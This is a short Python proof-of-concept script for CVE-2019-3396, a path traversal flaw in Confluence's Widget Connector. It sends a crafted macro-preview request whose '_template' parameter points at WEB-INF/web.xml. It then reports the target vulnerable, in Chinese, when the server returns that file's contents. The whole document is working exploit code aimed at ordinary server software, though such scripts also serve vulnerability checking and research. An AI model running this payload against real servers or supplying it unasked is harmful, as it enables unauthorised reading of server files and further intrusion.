import requests
import sys

data = '''
{"contentId":"786457","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"WEB-INF/web.xml"}}}
'''

def poc(url):
	headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
            "Referer": url + "/pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&",
            "Content-Type": "application/json; charset=utf-8"
        }
	r = requests.post(url,headers=headers,data=data)
	if r.status_code == 200 and '<web-app xmlns="http://java.sun.com/xml/ns/javaee"' in r.text:
            	print("[	+	}存在Confluence Widget Connector path traversal (CVE-2019-3396)漏洞")
            	#print(r.text)


def main(url):
	url = url + "rest/tinymce/1/macro/preview"
	poc(url)



if __name__ == '__main__':
	url = sys.argv[1]
	main(url)
